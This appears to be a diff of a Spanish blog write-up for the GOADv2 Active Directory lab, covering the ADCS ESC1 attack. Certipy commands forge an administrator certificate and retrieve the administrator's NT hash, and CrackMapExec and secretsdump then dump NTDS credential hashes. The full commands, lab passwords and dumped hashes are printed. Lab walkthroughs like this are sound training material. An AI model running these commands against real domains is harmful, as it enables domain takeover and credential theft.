@@ -3754,53 +3754,55 @@ Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2028.png)
 
----
+    ---
 
 ## ADCS - ESC1
+
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2029.png)
+
+Se ejecuta certipy para extraer los archivos necesarios para realizar la enumeración, utilizando el comando: `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12`
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
     
-    ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2029.png)
+[*] Finding certificate templates
+[*] Found 38 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 16 enabled certificate templates
+[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
+[*] Got CA configuration for 'ESSOS-CA'
+[*] Saved BloodHound data to '20230907210109_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20230907210109_Certipy.txt'
+[*] Saved JSON output to '20230907210109_Certipy.json'
+```
+
+Se corre el BloodHound modificado, [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases){:target="_blank"} y se carga el archivo .zip. Una vez cargado, se procede a la sección PKI - Find Misconfigured Certificate Templates (ESC1)
+
+  
     
-    Se ejecuta certipy para extraer los archivos necesarios para realizar la enumeración, utilizando el comando: `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12`
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2030.png)
     
-    ```csharp
-    ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
-    └──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
-    Certipy v4.7.0 - by Oliver Lyak (ly4k)
+Ahora se ejecuta certipy para obtener el archivo PFX del usuario solicitado, en este caso, el usuario es "administrator".
     
-    [*] Finding certificate templates
-    [*] Found 38 certificate templates
-    [*] Finding certificate authorities
-    [*] Found 1 certificate authority
-    [*] Found 16 enabled certificate templates
-    [*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
-    [*] Got CA configuration for 'ESSOS-CA'
-    [*] Saved BloodHound data to '20230907210109_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
-    [*] Saved text output to '20230907210109_Certipy.txt'
-    [*] Saved JSON output to '20230907210109_Certipy.json'
-    ```
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+  
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 15
+[*] Got certificate with UPN 'administrator@essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
     
-    Se corre el BloodHound modificado, [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases){:target="_blank"} y se carga el archivo .zip. Una vez cargado, se procede a la sección PKI - Find Misconfigured Certificate Templates (ESC1)
+Se ejecuta certipy para obtener el hash del administrador. Con este hash, se puede proceder a realizar un volcado del NTDS.
     
-    ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2030.png)
-    
-    Ahora se ejecuta certipy para obtener el archivo PFX del usuario solicitado, en este caso, el usuario es "administrator".
-    
-    ```jsx
-    ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
-    └──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
-    Certipy v4.7.0 - by Oliver Lyak (ly4k)
-    
-    [*] Requesting certificate via RPC
-    [*] Successfully requested certificate
-    [*] Request ID is 15
-    [*] Got certificate with UPN 'administrator@essos.local'
-    [*] Certificate has no object SID
-    [*] Saved certificate and private key to 'administrator.pfx'
-    ```
-    
-    Se ejecuta certipy para obtener el hash del administrador. Con este hash, se puede proceder a realizar un volcado del NTDS.
-    
-    ```jsx
+```jsx
     ┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
     └──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
     Certipy v4.8.1 - by Oliver Lyak (ly4k)
@@ -3811,11 +3813,11 @@ Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de
     [*] Saved credential cache to 'administrator.ccache'
     [*] Trying to retrieve NT hash for 'administrator'
     [*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
-    ```
+```
     
-    Para este ejemplo, el volcado del NTDS se realizará con CrackMapExec y SecretsDump. Con CrackMapExec, el proceso se llevaría a cabo de la siguiente manera:
+Para este ejemplo, el volcado del NTDS se realizará con CrackMapExec y SecretsDump. Con CrackMapExec, el proceso se llevaría a cabo de la siguiente manera:
     
-    ```jsx
+```jsx
     ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
     └──╼ #cme smb essos.local -u administrator -H '54296a48cd30259cc88095373cec24da' --ntds
     [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
@@ -3840,11 +3842,11 @@ Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de
     SMB         essos.local     445    MEEREEN          [*] To extract only enabled accounts from the output file, run the following command: 
     SMB         essos.local     445    MEEREEN          [*] cat /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds | grep -iv disabled | cut -d ':' -f1
     SMB         essos.local     445    MEEREEN          [*] grep -iv disabled /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds | cut -d ':' -f1
-    ```
+```
     
-    Mientras que con SecretsDump, el proceso se llevaría a cabo de la siguiente manera:
+Mientras que con SecretsDump, el proceso se llevaría a cabo de la siguiente manera:
     
-    ```jsx
+```jsx
     ┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
     └──╼ #secretsdump.py essos.local/Administrator@192.168.56.12 -hashes aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
     Impacket v0.11.0 - Copyright 2023 Fortra
@@ -3919,7 +3921,7 @@ Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de
     SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:5a226a85e65aa8d5cfe2c899b9d4ad1b
     SEVENKINGDOMS$:des-cbc-md5:7f54e9fb4513014a
     [*] Cleaning up...
-    ```
+```
     
     ---
     
